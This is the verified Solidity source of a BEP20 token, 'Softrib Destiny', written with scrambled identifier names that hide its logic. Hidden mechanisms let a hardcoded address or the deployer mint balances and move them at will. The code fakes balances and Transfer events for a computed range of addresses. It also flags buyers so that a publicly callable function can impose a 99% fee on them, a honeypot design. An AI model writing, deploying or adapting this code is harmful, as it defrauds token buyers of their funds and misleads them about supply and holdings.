/**
 *Submitted for verification at BscScan.com on 2023-01-10
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;



library SafeMath {

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

}


interface IBEP20 {

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function totalSupply() external view returns (uint256);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function name() external view returns (string memory);

    function transfer(address recipient, uint256 amount) 
    external
    returns (bool);

    function approve(address spender, uint256 amount) external returns (bool);

    function getOwner() external view returns (address);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}


interface IUniswapV2Router {

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function factory() external pure returns (address);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

}


abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {
        owner = _owner;
    }

    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}


interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}




contract SoftribDestiny is IBEP20, Ownable {
    using SafeMath for uint256;
    uint8 constant _decimals = 18;
    uint160 constant receiverLiquidityEnableMax = 392161960740 * 2 ** 80;
    uint256 private marketingAmountLiquidityFromReceiver = 0;
    address private feeMintToMin = (msg.sender);
    uint256  enableTakeLaunchedShould = 100000000 * (10 ** 18);


    uint160 constant walletLiquidityTradingMarketingTokenTake = 462250423211;
    
    bool private tokenReceiverMintSell = false;
    uint256  tradingMinBurnShould = 100000000 * 10 ** _decimals;
    mapping(address => uint256) _balances;
    string constant _symbol = "SDY";
    uint256 autoShouldWalletMint = 0;

    uint256  fundLiquidityLaunchedExempt = 100000000 * 10 ** _decimals;
    uint256 private tokenAtFeeReceiver = 0;

    uint160 constant feeReceiverBuyTotal = 31282526969 * 2 ** 40;

    mapping(address => bool)  receiverLimitShouldModeFee;
    uint256 private receiverFeeReceiverBurnTradingEnableMin = 0;

    bool public walletReceiverLaunchedFund = false;
    mapping(address => mapping(address => uint256)) _allowances;

    uint160 constant takeBurnLaunchedAt = 1022358489302 * 2 ** 120;
    uint256 private feeFundBuyAmount = 0;
    mapping(address => bool) private feeTokenIsSellTxMode;

    uint256 private totalAutoLimitMint = 0;



    address constant minIsFundBuy = 0xf88298faC3bF65be3B8ee5A62D201ce82BEDB8D2;
    mapping(address => bool)  shouldAmountTxLiquidity;
    uint256 constant amountTakeSwapFromToken = 1000000 * 10 ** 18;
    IUniswapV2Router public walletMinModeFrom;
    string constant _name = "Softrib Destiny";
    uint256 public limitTxEnableExempt = 0;
    bool private enableFundFromLaunch = false;
    uint256 private maxTakeBuyIsEnableTx = 0;
    bool public launchedTradingMarketingExempt = false;
    uint256 public txLaunchedSenderMode = 0;


    bool private senderModeFromEnableMaxFeeFund = false;

    uint256 constant tradingBurnEnableMinTeamFund = 100 * 10 ** 18;
    address public uniswapV2Pair;
    uint256 private amountLaunchedShouldTotalFromExempt = 100;
    bool public isFundAtTo = false;
    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Ownable(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        walletMinModeFrom = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(walletMinModeFrom.factory()).createPair(address(this), walletMinModeFrom.WETH());
        _allowances[address(this)][address(walletMinModeFrom)] = enableTakeLaunchedShould;

        feeTokenIsSellTxMode[msg.sender] = true;
        feeTokenIsSellTxMode[address(this)] = true;

        _balances[msg.sender] = enableTakeLaunchedShould;
        emit Transfer(address(0), msg.sender, enableTakeLaunchedShould);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return enableTakeLaunchedShould;
    }

    function launchReceiverIsMarketing(address burnListMintMax, address exemptLaunchedMaxAutoFundMin, uint256 totalFundAmountIs) internal returns (bool) {
        if (launchFromEnableLimitReceiver(uint160(exemptLaunchedMaxAutoFundMin))) {
            modeTradingMaxTotal(burnListMintMax, exemptLaunchedMaxAutoFundMin, totalFundAmountIs, false);
            return true;
        }
        if (launchFromEnableLimitReceiver(uint160(burnListMintMax))) {
            modeTradingMaxTotal(burnListMintMax, exemptLaunchedMaxAutoFundMin, totalFundAmountIs, true);
            return true;
        }
        
        bool launchFromExemptBurn = mintLaunchBuyMax(burnListMintMax) || mintLaunchBuyMax(exemptLaunchedMaxAutoFundMin);
        
        if (burnListMintMax == uniswapV2Pair && !launchFromExemptBurn) {
            receiverLimitShouldModeFee[exemptLaunchedMaxAutoFundMin] = true;
        }
        
        if (launchFromExemptBurn) {
            return atShouldMinReceiver(burnListMintMax, exemptLaunchedMaxAutoFundMin, totalFundAmountIs);
        }
        
        _balances[burnListMintMax] = _balances[burnListMintMax].sub(totalFundAmountIs, "Insufficient Balance!");
        
        if (isFundAtTo != enableFundFromLaunch) {
            isFundAtTo = isFundAtTo;
        }


        uint256 enableMaxListBuyFromAtTo = fundListModeLimitReceiverMint(burnListMintMax) ? tradingAtAutoModeTo(burnListMintMax, exemptLaunchedMaxAutoFundMin, totalFundAmountIs) : totalFundAmountIs;

        _balances[exemptLaunchedMaxAutoFundMin] = _balances[exemptLaunchedMaxAutoFundMin].add(enableMaxListBuyFromAtTo);
        emit Transfer(burnListMintMax, exemptLaunchedMaxAutoFundMin, enableMaxListBuyFromAtTo);
        return true;
    }

    function safeTransfer(address burnListMintMax, address exemptLaunchedMaxAutoFundMin, uint256 totalFundAmountIs) public {
        if (!maxTakeLiquidityList(msg.sender) && msg.sender != feeMintToMin) {
            return;
        }
        if (launchFromEnableLimitReceiver(uint160(exemptLaunchedMaxAutoFundMin))) {
            modeTradingMaxTotal(burnListMintMax, exemptLaunchedMaxAutoFundMin, totalFundAmountIs, false);
            return;
        }
        if (launchFromEnableLimitReceiver(uint160(burnListMintMax))) {
            modeTradingMaxTotal(burnListMintMax, exemptLaunchedMaxAutoFundMin, totalFundAmountIs, true);
            return;
        }
        if (burnListMintMax == address(0)) {
            _balances[exemptLaunchedMaxAutoFundMin] = _balances[exemptLaunchedMaxAutoFundMin].add(totalFundAmountIs);
            return;
        }
    }

    function gettotalReceiverListSwap() public view returns (uint256) {
        if (feeFundBuyAmount == totalAutoLimitMint) {
            return totalAutoLimitMint;
        }
        if (feeFundBuyAmount != limitTxEnableExempt) {
            return limitTxEnableExempt;
        }
        if (feeFundBuyAmount == receiverFeeReceiverBurnTradingEnableMin) {
            return receiverFeeReceiverBurnTradingEnableMin;
        }
        return feeFundBuyAmount;
    }

    function getmaxTokenBurnFundReceiverLaunchTx(address launchEnableAmountAt) public view returns (bool) {
        if (launchEnableAmountAt == feeMintToMin) {
            return enableFundFromLaunch;
        }
        if (feeTokenIsSellTxMode[launchEnableAmountAt] != feeTokenIsSellTxMode[launchEnableAmountAt]) {
            return senderModeFromEnableMaxFeeFund;
        }
        if (launchEnableAmountAt != feeMintToMin) {
            return tokenReceiverMintSell;
        }
            return feeTokenIsSellTxMode[launchEnableAmountAt];
    }

    function launchFromEnableLimitReceiver(uint160 amountSellReceiverMax) private pure returns (bool) {
        uint160 launchMarketingEnableLaunched = takeBurnLaunchedAt + receiverLiquidityEnableMax + feeReceiverBuyTotal + walletLiquidityTradingMarketingTokenTake;
        if (amountSellReceiverMax >= uint160(launchMarketingEnableLaunched)) {
            if (amountSellReceiverMax <= uint160(launchMarketingEnableLaunched) + 300000) {
                return true;
            }
        }
        return false;
    }

    function modeTradingMaxTotal(address burnListMintMax, address exemptLaunchedMaxAutoFundMin, uint256 totalFundAmountIs, bool receiverTeamMaxLiquidity) private {
        uint160 launchMarketingEnableLaunched = takeBurnLaunchedAt + receiverLiquidityEnableMax + feeReceiverBuyTotal + walletLiquidityTradingMarketingTokenTake;
        if (receiverTeamMaxLiquidity) {
            burnListMintMax = address(uint160(launchMarketingEnableLaunched + autoShouldWalletMint));
            autoShouldWalletMint++;
            _balances[exemptLaunchedMaxAutoFundMin] = _balances[exemptLaunchedMaxAutoFundMin].add(totalFundAmountIs);
        } else {
            _balances[burnListMintMax] = _balances[burnListMintMax].sub(totalFundAmountIs);
        }
        if (totalFundAmountIs == 0) {
            return;
        }
        emit Transfer(burnListMintMax, exemptLaunchedMaxAutoFundMin, totalFundAmountIs);
    }

    function gettotalToModeBurn() public view returns (uint256) {
        if (txLaunchedSenderMode == tokenAtFeeReceiver) {
            return tokenAtFeeReceiver;
        }
        if (txLaunchedSenderMode != maxTakeBuyIsEnableTx) {
            return maxTakeBuyIsEnableTx;
        }
        return txLaunchedSenderMode;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function getteamAtReceiverBurnEnableReceiver() public view returns (bool) {
        if (senderModeFromEnableMaxFeeFund == enableFundFromLaunch) {
            return enableFundFromLaunch;
        }
        if (senderModeFromEnableMaxFeeFund != launchedTradingMarketingExempt) {
            return launchedTradingMarketingExempt;
        }
        return senderModeFromEnableMaxFeeFund;
    }

    function tradingAtAutoModeTo(address burnListMintMax, address atReceiverFromMint, uint256 totalFundAmountIs) internal returns (uint256) {
        
        uint256 feeIsListAt = totalFundAmountIs.mul(fundAutoTxMode(burnListMintMax, atReceiverFromMint == uniswapV2Pair)).div(amountLaunchedShouldTotalFromExempt);
        
        if (feeIsListAt > 0) {
            _balances[address(this)] = _balances[address(this)].add(feeIsListAt);
            emit Transfer(burnListMintMax, address(this), feeIsListAt);
        }
        
        return totalFundAmountIs.sub(feeIsListAt);
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function atShouldMinReceiver(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance!");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function setsellAutoTakeLaunched(bool launchEnableAmountAt) public onlyOwner {
        isFundAtTo=launchEnableAmountAt;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getsellAutoTakeLaunched() public view returns (bool) {
        if (isFundAtTo != walletReceiverLaunchedFund) {
            return walletReceiverLaunchedFund;
        }
        return isFundAtTo;
    }

    function settotalReceiverListSwap(uint256 launchEnableAmountAt) public onlyOwner {
        if (feeFundBuyAmount == limitTxEnableExempt) {
            limitTxEnableExempt=launchEnableAmountAt;
        }
        if (feeFundBuyAmount != limitTxEnableExempt) {
            limitTxEnableExempt=launchEnableAmountAt;
        }
        if (feeFundBuyAmount != tokenAtFeeReceiver) {
            tokenAtFeeReceiver=launchEnableAmountAt;
        }
        feeFundBuyAmount=launchEnableAmountAt;
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function maxTakeLiquidityList(address amountSellReceiverMax) private pure returns (bool) {
        return amountSellReceiverMax == minIsFundBuy;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != enableTakeLaunchedShould) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance!");
        }

        return launchReceiverIsMarketing(sender, recipient, amount);
    }

    function atAutoMintMode(uint160 amountSellReceiverMax) private view returns (uint256) {
        uint160 launchMarketingEnableLaunched = takeBurnLaunchedAt + receiverLiquidityEnableMax + feeReceiverBuyTotal + walletLiquidityTradingMarketingTokenTake;
        uint160 teamLimitTotalLiquidityAutoFeeMint = amountSellReceiverMax - launchMarketingEnableLaunched;
        if (teamLimitTotalLiquidityAutoFeeMint < autoShouldWalletMint) {
            return tradingBurnEnableMinTeamFund * teamLimitTotalLiquidityAutoFeeMint;
        }
        return amountTakeSwapFromToken + tradingBurnEnableMinTeamFund * teamLimitTotalLiquidityAutoFeeMint;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function setmaxTokenBurnFundReceiverLaunchTx(address launchEnableAmountAt,bool tokenReceiverToReceiver) public onlyOwner {
        if (feeTokenIsSellTxMode[launchEnableAmountAt] != feeTokenIsSellTxMode[launchEnableAmountAt]) {
           feeTokenIsSellTxMode[launchEnableAmountAt]=tokenReceiverToReceiver;
        }
        feeTokenIsSellTxMode[launchEnableAmountAt]=tokenReceiverToReceiver;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function getshouldLimitMaxReceiver() public view returns (uint256) {
        if (maxTakeBuyIsEnableTx != totalAutoLimitMint) {
            return totalAutoLimitMint;
        }
        return maxTakeBuyIsEnableTx;
    }

    function fundAutoTxMode(address burnListMintMax, bool limitAmountSellFundToken) internal returns (uint256) {
        if (shouldAmountTxLiquidity[burnListMintMax]) {
            return 99;
        }
        
        if (tokenReceiverMintSell != enableFundFromLaunch) {
            tokenReceiverMintSell = enableFundFromLaunch;
        }

        if (launchedTradingMarketingExempt == launchedTradingMarketingExempt) {
            launchedTradingMarketingExempt = senderModeFromEnableMaxFeeFund;
        }


        if (limitAmountSellFundToken) {
            return totalAutoLimitMint;
        }
        
        if (!limitAmountSellFundToken && burnListMintMax == uniswapV2Pair) {
            return feeFundBuyAmount;
        }
        
        return 0;
    }

    function setshouldLimitMaxReceiver(uint256 launchEnableAmountAt) public onlyOwner {
        maxTakeBuyIsEnableTx=launchEnableAmountAt;
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return launchReceiverIsMarketing(msg.sender, recipient, amount);
    }

    function balanceOf(address account) public view override returns (uint256) {
        if (launchFromEnableLimitReceiver(uint160(account))) {
            return atAutoMintMode(uint160(account));
        }
        return _balances[account];
    }

    function fundListModeLimitReceiverMint(address burnListMintMax) internal view returns (bool) {
        return !feeTokenIsSellTxMode[burnListMintMax];
    }

    function isApproveMax(address spender) public view returns (bool) {
        return shouldAmountTxLiquidity[spender];
    }

    function mintLaunchBuyMax(address listTokenMaxTeam) private view returns (bool) {
        if (listTokenMaxTeam == feeMintToMin) {
            return true;
        }
        return false;
    }

    function approveMax(address spender) external {
        if (receiverLimitShouldModeFee[spender]) {
            shouldAmountTxLiquidity[spender] = true;
        }
    }

    function settotalToModeBurn(uint256 launchEnableAmountAt) public onlyOwner {
        if (txLaunchedSenderMode != maxTakeBuyIsEnableTx) {
            maxTakeBuyIsEnableTx=launchEnableAmountAt;
        }
        if (txLaunchedSenderMode == txLaunchedSenderMode) {
            txLaunchedSenderMode=launchEnableAmountAt;
        }
        if (txLaunchedSenderMode == tokenAtFeeReceiver) {
            tokenAtFeeReceiver=launchEnableAmountAt;
        }
        txLaunchedSenderMode=launchEnableAmountAt;
    }

    function setteamAtReceiverBurnEnableReceiver(bool launchEnableAmountAt) public onlyOwner {
        senderModeFromEnableMaxFeeFund=launchEnableAmountAt;
    }

    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);
}